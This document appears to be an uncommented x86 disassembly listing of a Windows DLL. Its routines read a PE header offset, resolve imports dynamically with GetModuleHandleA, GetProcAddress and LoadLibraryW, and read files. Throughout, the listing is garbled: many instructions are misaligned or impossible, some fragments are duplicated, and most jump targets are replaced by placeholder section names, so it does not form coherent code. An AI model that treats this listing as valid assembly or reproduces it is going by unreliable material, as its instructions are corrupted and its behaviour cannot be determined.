idiv [ ebp + 0x1c ]
add esp 0x0
cmp eax [ ebp + 0x10 ]
jl r-xdata
pop ebp
retn
sub_1000c392
dec ebp
and [ ecx + 0x50 ] dl
std
jne r-xdata
and [ ebx ] ch
inc ebp
and al 0xff
jne r-xdata
push [ ebp + 0x8 ]
call sub_1000c454
add esp 0x10
test eax eax
cmc
push [ es : ebp + 0x1c ]
mov eax [ ebp + 0x20 ]
sub eax [ ebp + 0x24 ]
push [ ebp + 0x18 ]
cmp eax eax
push eax
push [ ebp + 0x8 ]
call 0x1080cb87
imul eax eax 0x64
cdq
idiv [ ebp + 0x1c ]
add esp 0x0
cmp eax [ ebp + 0x10 ]
jl r-xdata
pop ebp
retn
sub_1000c3d0
push ebp
mov ebp esp
push ecx
push ebp
mov eax [ ebp + 0x18 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
xor ebx ebx
lea edi [ esi + eax * 4 ]
mov [ ebp - 0x4 ] ebx
cmp esi edi
mov [ ebp - 0x8 ] ebx
mov [ ebp + 0xc ] esi
jae r-xdata
mov eax [ ebp - 0x8 ]
sub eax esi
sar eax 0x2
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp + 0x18 ]
push 0x4
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000ca0a
add esp 0x10
test al al
je r-xdata
push 0xfffffffc
pop eax
push [ ebp - 0x6c ]
mov eax [ ebp + 0x18 ]
sub eax [ ebp + 0x1c ]
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_1000cb87
add esp 0x10
cmp eax ebx
jl r-xdata
jmp r-xdata
jpo r-xdata
mov [ ebp - 0x4 ] ebx
mov ebx eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
add al 0x83
sar ah 0xc2
push [ esp + 0xc ]
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_1000cab6
or esp 0xc
retn
cld
jl r-xdata
add [ ebp + 0xc ] 0x14
cmp eax 0xae520c7d
mov [ ebp - 0x4 ] eax
sub_1000c454
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
push 0x4
push [ esp + 0x14 ]
lea eax [ ecx + eax * 4 ]
push eax
push [ esp + 0x10 ]
call sub_1000ca0a
add esp 0x10
neg al
sbb eax eax
and eax 0x4
add eax 0xfffffffc
retn 0x74ff
sub_1000c492
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
and al 0xa1
add [ eax ] al
add [ eax ] al
push eax
mov esp [ fs : 0x0 ]
sub esp 0x2c
push ebx
salc
push edi
mov [ ebp - 0x18 ] esp
push rw-data
mov esi [ ebp + 0x8 ]
push esi
call sub_10009b69
mov edi eax
push r--data
push esi
enter 0xd696 0xff
sub_1000c4d2
dec [ ebp - 0x43972bbb ]
push es
add [ eax ] edx
push esi
call sub_10009b69
mov [ ebp - 0x3c ] eax
push 0x1081069c
push edi
call sub_10009b69
mov [ ebp - 0x34 ] eax
push rw-data
push esi
call 0xfff9b69
cdq
inc ebp
fsubr [ eax + 0x78 ]
push es
add [ eax ] edx
jbe r-xdata
pop esi
salc
sub_1000c568
xlat
mov esi eax
mov [ ebp - 0x30 ] esi
cmp esi ebx
jge r-xdata
cmp [ ebp + 0x18 ] bl
je r-xdata
push 0xfffffff8
jmp r-xdata
push esi
fist [ ebp - 0x3c ]
mov [ ebp - 0x4 ] ebx
push edi
push edi
push esi
call [ ebp - 0x24 ]
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
pop eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
call memcpy
adc esp 0xc
push esi
push edi
sti
push ebp
enter 0x5d38 0x18
je r-xdata
cmp [ ebp + 0x18 ] bl
je r-xdata
or [ esi + 0x7 ] 0x21
push ebx
push ebx
push ebx
sub al [ ecx ]
push ebx
push esi
mov edi 0xf88bcc55
cmp edi ebx
jne r-xdata
push esi
call [ ebp - 0x2c ]
mov eax ebx
jmp r-xdata
push esi
call [ ebp - 0x20 ]
push 0xffffffb7
pop edx
jmp r-xdata
push esi
call [ ebp - 0x20 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000c600
push ebp
mov ebp esp
push ebx
push edx
push edi
cmp [ rw-data ] 0x0
jne r-xdata
mov esp ebp
pop ebp
jmp [ rw-data ]
dec edx
add al ch
sub al [ eax ]
add [ eax ] al
add esp 0x4
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1000c640
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
cmp [ eax + ecx ] 0x1
adc [ eax - 0x6f6f3cff ] dh
nop
nop
nop
nop
xchg esp eax
nop
nop
nop
nop
nop
nop
call 0x2001cb8d
push rw-data
call [ GetModuleHandleA@IAT ]
push eax
call [ 0x3000e11c ]
xchg ebp eax
shl [ ebx + rw-data ] 0x75
or [ edx ] dh
rol bl 0x83
cmp al 0x8
add [ eax ] edx
mov al 0x1
retn
sub_1000c680
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
push ebx
lea eax [ ecx - 0x20 ]
ror [ ebp + 0x5350e445 ] 0x1
push 0x3
call 0x1200c7e7
add esp 0x14
test al al
je r-xdata
xor al al
cmp [ ebp - 0x20 ] ebx
je r-xdata
std
jne r-xdata
mov eax [ ebp - 0x1c ]
lea esi [ eax + 0x64 ]
xor edi edi
mov eax [ ebp - 0x1c ]
cmp edi [ eax ]
jae r-xdata
pop eax
retn
call [ free@IAT ]
pop ecx
mov [ ebp - 0x4 ] ebx
push rw-data
push [ esi + 0x4 ]
call [ _wcsicmp@IAT ]
pop ecx
pop ecx
add eax 0xb30475c0
add ebx ebp
xor edi edi
jbe r-xdata
add dl [ eax ]
pop ecx
or [ esi + 0x4 ] 0xffffff8d
je r-xdata
call [ 0x1002e1e8 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
add cl [ ecx + 0x7589dc75 ]
aam 0x8b
mov [ ebx + 0x157403e0 ] 0x3
sub_1000c755
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x20 ] esp
add ebp esp
sbb [ ebx + 0x56 ] dl
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
je r-xdata
adc [ ebx ] bl
inc ebx
je r-xdata
push rw-data
call [ GetModuleHandleA@IAT ]
push [ ebp + 0x8 ]
adc bh bh
adc eax GetProcAddress@IAT
sbb eax [ ebx + 0x74 ]
cmp ecx [ ecx + 0x5d89fc5d ]
fadd [ ebx + 0x7d0adc7d ]
sub eax [ eax + 0x1675b838 ]
xor eax eax
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x24 ] ebx
cmp [ ebp - 0x24 ] 0xa
jge r-xdata
inc eax
mov [ ebp - 0x20 ] eax
inc ebp
fsub st3
salc
push 0x1
pop eax
retn
cmp [ eax + 0x4 ] bl
jne r-xdata
or [ ebp - 0x4 ] 0xff
cmp [ eax ] 0xb8
jne r-xdata
inc eax
mov [ ebp - 0x28 ] eax
mov eax [ eax ]
or [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
cmp [ eax + 0x3 ] bl
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x200000 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000c7e7
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
xor bh bh
cmp ebx edi
je r-xdata
xor al al
pop edi
pop esi
pop ebx
leave
retn
mov esi [ ebp + 0x14 ]
cmp esi edi
je r-xdata
jmp r-xdata
cmp [ rw-data ] edi
jne r-xdata
call [ __import_lookup_table_1(KERNEL32:LoadLibraryW) ]
and [ ebp - 0x4 ] 0x0
mov [ ebx ] edi
mov ebx ebp
sbb [ ebp + 0x187d833e ] cl
add [ ebp + 0xe ] dh
push rw-data
call [ GetModuleHandleA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
cmp eax edi
mov [ rw-data ] eax
je r-xdata
pop ecx
test edi edi
or [ fs : edi - 0x1 ] dl
adc eax __import_lookup_table_1(KERNEL32:LoadLibraryW)
push ebx
push edi
call [ 0x1400e1dc ]
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
lea eax [ ebp - 0x10 ]
mov edi esi
push eax
push ebx
push esi
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call [ rw-data ]
cmp eax 0xc0400004
jne r-xdata
test eax eax
je r-xdata
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
test esi esi
je r-xdata
jmp r-xdata
push esi
or [ ecx ] al
adc [ esi + ebx * 2 - 0x7d ] dh
cld
add [ ecx + 0x18dd8b3b ] cl
lea edi [ esi ]
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
add ebx 0x400
cmp ebx 0x2c00
ja r-xdata
sub_1000c912
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
add [ ecx + 0x7d89e47d ] cl
xor al al
pop esi
push eax
inc [ edi ]
or al 0xe1
add [ eax + 0x4689c73b ] dl
add al 0x75
push cs
push [ esi ]
call [ CloseHandle@IAT ]
mov [ esi ] edi
xor al al
jmp r-xdata
jge r-xdata
pop edi
pop esi
pop ebp
retn
loopne r-xdata
push edi
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push 0xb
call sub_1000d4f0
and esp 0x10
movsb [ edi ] [ esi ]
shl [ ebx + edx * 2 - 0x75 ] 0x45
in al 0x3b
sub_1000c932
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
push ebx
push edi
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
je r-xdata
retn 0x595b
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x4 ] edi
push edi
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push 0xb
call sub_1000d4f0
and esp 0x10
movsb [ edi ] [ esi ]
shl [ ebx + edx * 2 - 0x75 ] 0x45
in al 0x3b
sub_1000c987
cmp [ ebp - 0x20 ] edi
je r-xdata
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
call _local_unwind2
pop ecx
pop ecx
mov esp edi
fist [ edi ]
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov ebx esp
mov [ ebp - 0x2c ] ebx
lea esi [ eax + 0x4 ]
mov [ ebp - 0x24 ] esi
and [ ebp - 0x28 ] edi
retn
push [ ebp - 0x1c ]
call [ free@IAT ]
pop ecx
and [ ebp - 0x20 ] 0x0
xor edi edi
imul eax eax 0x11c
lea edi [ esi ]
xor [ edi ] cl
mov bh 0x4f
sbb al [ ebx ]
enter 0x448d 0x31
sbb al 0x89
inc ebp
sar bh 0x1
jne r-xdata
pop ecx
test eax eax
jne r-xdata
push eax
call [ r-xdata ]
pop ecx
inc [ ebp - 0x28 ]
jmp r-xdata
mov edi [ edi + 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x28 ]
cmp eax [ ebx ]
jae r-xdata
sub_1000ca0a
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : ebp ] esp
add [ eax ] al
add [ ecx + 0x51 ] dl
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ecx [ ebp + 0x9 ]
adc al al
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x200 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x10 ] eax
je r-xdata
mov esi [ ebp + 0x14 ]
jpo r-xdata
mov bl 0xc0
cmp ecx eax
je r-xdata
je r-xdata
mov edi [ 0x37148d0c ]
cmp eax [ ecx + 0xc ]
jb r-xdata
mov [ 0x418b56fc ] eax
add al 0x3
jae r-xdata
cmp edx [ ecx + 0x8 ]
jbe r-xdata
sub_1000ca8f
push esi
mov esi [ esp + 0x10 ]
push edi
xor edi edi
test esi esi
jle r-xdata
mov eax edi
jg r-xdata
mov edx [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
sub ecx edx
adc [ ebx + 0x4d8d0c5d ] cl
cld
push 0x0
push ecx
push esi
push eax
push [ ebp + 0x8 ]
mov [ ebx ] eax
call edi
cmp [ ebp - 0x4 ] esi
je r-xdata
retn
mov al [ edx + 0x1750a3a ]
inc edi
inc edx
dec esi
jne r-xdata
mov eax [ ebx ]
dec edi
mov bh 0x40
push es
lea esi [ eax + eax * 4 ]
shl esi 0x3
push [ ebx ]
jg r-xdata
cld
pop eax
jmp r-xdata
push [ ebx ]
mov esi [ 0x1002e0c0 ]
call esi
mov edi [ ebp + 0x10 ]
push [ edi ]
call esi
and [ ebx ] 0x0
and [ edi ] 0x0
push esi
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp + 0x10 ]
push 0x0
mov [ ecx ] eax
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push eax
push [ ebp + 0x8 ]
call edi
cmp [ ebp - 0x4 ] esi
je r-xdata
shl al 0x0
push eax
and [ ebx ] 0x0
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0xfffffffc
sub_1000cab6
push ebp
mov edi eax
push ecx
push ecx
push ebx
push esi
mov esi [ SetFilePointer@IAT ]
xor ebx ebx
push edi
push ebx
push ebx
push 0x3c
push [ ebp + 0x8 ]
mov [ ebp - 0x8 ] ebx
call esi
cmp eax 0x7c
je r-xdata
lea eax [ ebp - 0x4 ]
mov edi [ ReadFile@IAT ]
push ebx
push eax
lea eax [ ebp - 0x8 ]
push 0x4
push eax
push [ ebp + 0x8 ]
call edi
push ebx
push ebx
push [ ebp - 0x8 ]
mov [ ebp - 0x4 ] ebx
push [ ebp + 0xc ]
call esi
cmp eax ebp
clc
jne r-xdata
push 0xfffffff9
jmp r-xdata
mov esi 0xf8
push esi
push 0x40
scasd [ edi ]
adc eax LocalAlloc@IAT
mov ebx [ ebp + 0xc ]
lea ecx [ ebp - 0x4 ]
push 0x0
push ecx
push esi
push eax
push [ ebp + 0x8 ]
mov [ ebx ] eax
call edi
cmp [ ebp - 0x4 ] esi
je r-xdata
pop eax
jmp r-xdata
mov eax [ ebx ]
dec edi
mov bh 0x40
push es
lea esi [ eax + eax * 4 ]
shl esi 0x3
push [ ebx ]
jg r-xdata
pop edi
pop esi
pop ebx
leave
retn
cld
push [ ebx ]
mov esi [ 0x1002e0c0 ]
call esi
mov edi [ ebp + 0x10 ]
push [ edi ]
call esi
and [ ebx ] 0x0
and [ edi ] 0x0
push esi
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp + 0x10 ]
push 0x0
mov [ ecx ] eax
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push eax
push [ ebp + 0x8 ]
call edi
cmp [ ebp - 0x4 ] esi
je r-xdata
shl al 0x0
push eax
and [ ebx ] 0x0
jmp r-xdata
push 0xfffffffc
sub_1000cb87
adc eax 0x458bec8b
or [ ebx ] dh
test eax 0x57c13a52
je r-xdata
push 0x57
cmp [ ebp + 0x10 ] ecx
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x15 ]
cmp ecx [ eax + 0xc ]
lea edx [ esi + edi ]
jb r-xdata
push ss
ja r-xdata
pop edi
pop esi
pop ebp
retn
push 0xfffffffd
jmp r-xdata
cmp edx [ eax + 0x8 ]
jbe r-xdata
pop eax
mov eax [ eax + 0x4 ]
pop edi
add eax esi
push eax
push [ ebp + 0x10 ]
call sub_1000ca8f
add esp 0x4c
jmp r-xdata
sub_1000cc0d
mov ebx [ esp + 0x24 ]
test ebx ebx
jne r-xdata
stosd [ edi ]
jl r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop eax
retn
call sub_1000cfc0
add esp 0x28
test eax eax
je r-xdata
sbb al 0x85
push [ ebp + 0x8 ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
cmp [ esi ] 0x40
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
or [ esi + 0x48 ] dh
pop edi
pop esi
pop ebp
xor eax esp
pop ebx
pop ecx
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
sub_1000cc2d
push 0x0
push 0x4
push 0x4
push 0x4
push 0x4
push 0x4
push 0x4
push 0x4
push 0x2
imul eax [ eax ] 0xe8000092
ja r-xdata
les ebp [ eax ]
test eax eax
je r-xdata
add [ eax ] al
add esp 0x28
cmp [ esi ] 0x40
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
or [ esi + 0x48 ] dh
pop edi
pop esi
pop ebp
xor eax esp
pop ebx
pop ecx
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
sub_1000cc7b
mov ah 0x55
mov eax esi
or al 0x57
push esi
call sub_1000d060
mov ecx [ esp + eax + 0x24 ]
add esp 0x14
neg eax
sbb eax eax
pop edi
not eax
pop esi
pop ebp
and eax ecx
pop ebx
pop ecx
retn
sub_1000cccc
inc esp
and al 0x14
add al 0x0
cmp eax eax
mov [ esp + eax + 0x14 ] al
inc ecx
cmp eax 0x10
jl r-xdata
mov ecx [ esp + 0x14 ]
xor eax eax
cmp ecx 0x3020100
mov edx 0x100
sete al
xor ecx ecx
cmp ax 0x2454
adc al 0xf
xchg esp eax
shl [ ebx ] 0xc1
and eax 0x1
mov esi eax
and esi 0x1
cmp esi 0x1
je r-xdata
and edi 0x1
cmp esi 0x1
jne r-xdata
xor eax eax
lea ecx [ esp + 0x4 ]
and esi 0x1
cmp esi 0x1
jne r-xdata
xor eax eax
lea ecx [ esp + 0x4 ]
bound ecx [ ebx + 0x40140474 ]
mov [ ecx ] si
add ecx 0x2
cmp eax 0x4
jl r-xdata
cmp eax eax
cmp [ esp + 0xa ] 0x403
sete al
xor ecx ecx
cmp [ esp + 0x9 ] 0x302
or eax 0xc123c194
xor ecx [ ecx + 0x66 ]
cmp [ esp + 0x6 ] 0x940f0201
and [ ebx ] 0x66c933c1
cmp [ esp + 0x4 ] edx
or eax 0xc123c194
and eax 0x1
mov esi eax
mov eax esi
pop esi
dec eax
mov ch 0xd8
sbb eax edx
add esp 0x20
retn
call sub_1000cf90
mov esi eax
neg esi
sbb esi esi
inc esi
and esi 0x1
cmp esi 0x1
jne r-xdata
mov edx [ esp + eax + 0x14 ]
inc eax
mov [ ecx ] edx
add ecx 0x4
cmp eax 0x4
jl r-xdata
mov ecx [ esp + 0xc ]
mov esi [ eax + 0x4 ]
or [ ebx ] dh
rol [ ecx + 0x40302f9 ] 0x5
sete al
xor ecx ecx
cmp esi 0x4130205
mov esi [ esp + 0x10 ]
sete cl
and eax ecx
xor edx edx
cmp esi 0x6050403
or esi [ esp + 0x4 ]
sete dl
and eax edx
xor ecx eax
cmp esi 0x3020100
sete cl
and eax ecx
and eax 0x1
mov esi eax
mov edx [ rw-data ]
xor eax eax
test edx edx
jbe r-xdata
push 0x44
or [ ecx ] al
adc al ch
sahf
add [ eax ] eax
add [ ebx + 0x4c483f0 ] cl
ficomp [ bp + di ]
test [ esi - 0x7d ] 0xe6
add eax 0x7501fe83
pop es
call sub_1000cf40
and esi eax
mov ecx rw-data
lea esi [ eax - 0x3 ]
inc eax
mov [ ecx ] esi
add ecx 0x4
cmp eax edx
jb r-xdata
add [ eax ] edx
sub_1000ce38
xchg ecx eax
nop
nop
nop
nop
nop
nop
nop
sub esp 0x3c
adc eax eax
mov [ esp ] al
inc eax
mov [ 0xfffffffff67c1078 ] eax
push ebx
push esi
push edi
lea eax [ esp + 0x1c ]
push 0x4
push eax
call sub_1000d2e0
lea edx [ esp + eax + 0x24 ]
lea ecx [ esp + 0x24 ]
mov esi edx
or edi 0xffffffff
add esp 0x8
sub esi ecx
xor eax eax
cmp [ edi - 0x6bf00001 ] 0x33c0
leave
sar edi cl
dec [ ebx ]
xchg esp eax
shl [ ebx ] 0xc1
xor ecx ecx
cmp esi 0x4
setl cl
and eax ecx
xor ecx ecx
test esi esi
setge cl
and eax ecx
and eax 0x1
cmp eax 0x1
jne r-xdata
xor esi esi
xor ecx ecx
test esi esi
sete cl
and ecx 0x1
and eax [ ecx - 0x7d ]
clc
add [ edi ] ecx
test [ esi - 0x47000000 ] edi
or al [ eax ]
add [ ebx - 0x7205743e ] cl
pop edx
add al 0xf3
stosd [ edi ]
mov ecx 0x8
xor eax eax
mov edi ebx
[ edi ]
mov esi [ edx ]
mov ecx ebx
cmp esi edx
mov edi 0x8
sete al
and eax 0x3
mov esi eax
mov ecx 0x8
mov ecx [ ecx ]
xor eax eax
test ebx ebx
sete al
and esi eax
add ecx 0x4
dec edi
jne r-xdata
mov edi [ edx + 0x24 ]
xor ecx ecx
cmp edi edx
sete cl
mov [ 0x1fe83f1 ] eax
jne r-xdata
and eax 0x1
dec ecx
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
add esp 0x3c
retn
lea edx [ esp + 0xd ]
push 0x4
push edx
call sub_1000d2e0
mov ecx eax
add esp 0x8
inc ecx
lea esi [ esp + 0xd ]
lea edx [ esp + ecx + 0xc ]
mov eax edx
and al 0x3
neg al
sbb eax eax
inc eax
cmp edx esi
sbb esi esi
inc esi
and [ esi - 0x7d ] eax
stc
add eax 0xdef7f61b
sub_1000cf40
daa
mov [ ebx - 0x9e4fe07 ] 0x47
and eax esi
lea esi [ esp + 0x11 ]
and eax 0x1
cmp bl ah
sbb esi esi
test edx 0xf883c623
add [ ebp + 0x21 ] esi
mov [ esp + ecx + 0x10 ] edi
mov ebx [ edx ]
xor esi esi
cmp esi edi
pop edi
sbb ecx ecx
neg ecx
cmp esi ebx
pop esi
sbb edx edx
pop ebx
neg edx
and ecx edx
and eax ecx
add esp 0x3c
retn
sub_1000cf9e
xchg esp eax
nop
mov eax [ esp + 0x4 ]
cmp [ eax ] 0xfffffffd
jne r-xdata
mov eax 0x1
retn
xor [ eax + 0x4 ] 0xfffffffe
jne r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
or [ es : ebx + 0x554fff8 ] al
cmp eax 0x2
jne r-xdata
xor eax eax
retn
or eax 0xffffffff
retn
mov eax [ esp ]
or al 0x83
clc
push [ ebp + eax - 0x7d ]
clc
add al 0x75
mov eax [ si + 0x24 ]
adc [ ebx + 0x574fff8 ] al
cmp eax 0x4
jne r-xdata
mov eax [ esp + 0x14 ]
sar eax cl
push [ ebp + eax - 0x7d ]
clc
add al 0x75
dec ebx
mov eax [ esp + 0x18 ]
cmp eax 0xffffffff
je r-xdata
mov eax [ esp + 0x1c ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0x4
jne r-xdata
mov eax [ eax + 0x20 ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0xc
jne r-xdata
mov eax [ esp + 0x24 ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0x4
jne r-xdata
mov [ esp + 0x28 ] eax
cmp eax 0xffffffff
add eax 0x7504f883
add eax 0xfffc47e9
inc [ ebx - 0x6f3c0038 ]
nop
xchg edx eax
cmp eax 0x4
jne r-xdata
sub_1000cfc0
mov eax [ esp + 0x4 ]
mov [ ecx ] rw-data
add [ eax ] eax
add [ eax ] al
test eax eax
jl r-xdata
or eax 0xffffffff
retn
mov eax [ esi + 0x8 ]
cmp eax 0xffffffff
push esp
add eax 0x7502f883
jne r-xdata
sbb edx edx
pop ebx
neg edx
and ecx edx
and eax ecx
add esp 0x3c
retn
add al 0x24
or al 0x83
clc
push [ ebp + eax - 0x7d ]
clc
add al 0x75
mov eax [ si + 0x24 ]
adc [ ebx + 0x574fff8 ] al
cmp eax 0x4
jne r-xdata
mov eax [ esp + 0x14 ]
sar eax cl
push [ ebp + eax - 0x7d ]
clc
add al 0x75
dec ebx
mov eax [ esp + 0x18 ]
cmp eax 0xffffffff
je r-xdata
mov eax [ esp + 0x1c ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0x4
jne r-xdata
mov eax [ eax + 0x20 ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0xc
jne r-xdata
mov eax [ esp + 0x24 ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0x4
jne r-xdata
mov [ esp + 0x28 ] eax
cmp eax 0xffffffff
add eax 0x7504f883
add eax 0xfffc47e9
inc [ ebx - 0x6f3c0038 ]
nop
xchg edx eax
cmp eax 0x4
jne r-xdata
sub_1000d060
sub esp 0x8
push ecx
xor eax eax
xor ecx ecx
push ebp
mov ebp [ esp + 0x14 ]
xor ebx ebx
push esi
xlat
mov [ esp + 0x10 ] ebx
mov [ eax + 0x14 ] 0x1
xor eax edx
mov al [ ecx + ebp ]
lea eax [ eax + eax + 0x1 ]
or edx eax
shr edx 0x8
and edx 0x1
inc ebp
mov edx eax
shr edx 0x8
and edx 0x1
jmp r-xdata
mov esi 0x100001
mov esi [ esp + 0x24 ]
mov dl [ ecx + ebp ]
mov [ ebx + esi ] dl
inc ebx
mov [ esp + 0x10 ] ebx
inc ecx
jmp r-xdata
test edx edx
je r-xdata
xor eax eax
mov al [ ecx + ebp ]
adc [ eax + eax + 0x1 ] 0xe8c1c08b
or [ ebx - 0x72befe1f ] al
cmp al 0x70
lea eax [ edx + edx ]
test al al
je r-xdata
mov eax edx
shr eax 0x8
and eax 0x1
imul edx [ edx ] 0x33
ror [ edx + 0x54812904 ] 0x0
add [ ebx + 0x8e8c1c0 ] ecx
and ecx 0x1
inc ecx
lea edi [ eax + esi * 2 ]
add eax eax
test al al
je r-xdata
xor edx edx
mov dl [ eax + ebp ]
lea eax [ edx + edx + 0x1 ]
mov edx eax
shr edx 0x8
and edx 0x11
inc ecx
mov edx eax
shl edx 0x8
and edx 0x8
jmp r-xdata
cmp edi 0x2
jne r-xdata
add eax ecx
test al al
je r-xdata
test edx edx
jne r-xdata
xor edx edx
add edi 0xfffffd
mov dl [ ecx + ebp ]
mov esi edx
shl edi 0x8
or esi edi
inc ecx
xor esi 0xffffffff
je r-xdata
mov ebx [ esp + 0x10 ]
add eax eax
test al al
je r-xdata
xor eax eax
mov al [ ecx + ebp ]
lea eax [ eax + eax + 0x1 ]
mov edx eax
shr edx 0x8
and edx 0x1
inc ecx
lea esi [ edx + edi * 2 - 0x2 ]
jmp r-xdata
mov edx eax
shr edx 0x8
and edx 0x1
lea esi [ edx + edi * 2 - 0x2 ]
jmp r-xdata
mov eax [ esp + 0x28 ]
pop edi
pop esi
pop ebp
mov [ eax ] ebx
mov eax [ esp + 0x14 ]
cmp ecx eax
pop ebx
jne r-xdata
mov edx esi
not edx
shr esi 0x1
and edx 0x1
inc esi
mov bl dl
mov [ esp + 0x14 ] ebx
xor edx edx
mov ss [ ecx + ebp ]
lea eax [ edx + edx + 0x1 ]
mov edx eax
retn
mov edx eax
shr edx 0x8
and edx 0x0
jmp r-xdata
lea edx [ eax + eax ]
test dl dl
je r-xdata
sbb eax eax
and al 0xfc
add eax 0xffffff37
add esp 0x8
retn
xor eax eax
add esp 0x0
retn
xor eax eax
mov al [ ecx + ebp ]
lea eax [ eax ]
add [ ebx + 0x8eec1f0 ] ecx
and esi 0x1
inc ecx
lea edi [ esi + edx * 2 ]
add eax eax
test al al
je r-xdata
mov ebp [ esp + 0x10 ]
pop es
lea edx [ eax + eax ]
test dl dl
je r-xdata
mov bl [ esi ]
mov [ edx + ebp ] bl
inc ebp
inc esi
dec edi
jne r-xdata
test eax 0x8b10246c
insb
and al 0x1c
mov ebx [ esp + 0x10 ]
jmp r-xdata
xor edx edx
mov dl [ ecx + ebp ]
lea edx [ edx + edx + 0x1 ]
mov eax edx
shr eax 0x8
and eax 0x1
inc ecx
lea edi [ eax + edi * 2 ]
pop [ edx + edx ]
test dl al
je r-xdata
mov eax edx
shr eax 0x8
and eax 0x1
sti
adc dh [ ebx ]
ror [ edx + 0x548d2914 ] cl
adc al [ ecx ]
jae r-xdata
mov edx eax
shr edx 0x8
and edx 0x9
jmp r-xdata
test edi edi
jne r-xdata
cmp al 0x56
mov al [ ecx + ebp ]
lea eax [ eax + eax + 0x1 ]
mov edx eax
shr edx 0x8
and edx 0x1
inc ecx
test edx edx
je r-xdata
or [ ebx ] cl
test [ ecx - 0x7d ] 0x840ffff6
enter 0x0 0x0
push ecx
mov edx 0x500
cmp edx ebx
stosd [ edi ]
cmc
sbb edx edx
sub esi ebx
neg [ edx + 0x548bfa83 ]
and al 0x24
add esi edx
inc esp
mov bl [ edx ]
inc esi
mov [ edx + ebp - 0x1 ] bl
mov [ 0x6c8b02c7 ] eax
and al 0x10
sub_1000d270
mov edx [ esp + 0x4 ]
push esi
mov esi [ esp + 0xc ]
mov ecx edx
xor eax eax
imul ecx esi
test edx edx
ja r-xdata
xor eax eax
pop esi
retn
test esi esi
jbe r-xdata
cmp ecx edx
push edx
adc eax 0x1172ce3b
cmp cl 0xff
jae r-xdata
push ecx
call [ malloc@IAT ]
add esp 0x4
dec esi
retn
sub_1000d2e0
mov eax [ esp + 0x4 ]
push esi
push esp
call sub_1000d2d0
mov esi [ esp + 0x10 ]
mov ecx eax
xor edx edx
add esp 0x4
lea eax [ ecx + esi - 0x1 ]
div dh
imul eax esi
sub eax ecx
pop esi
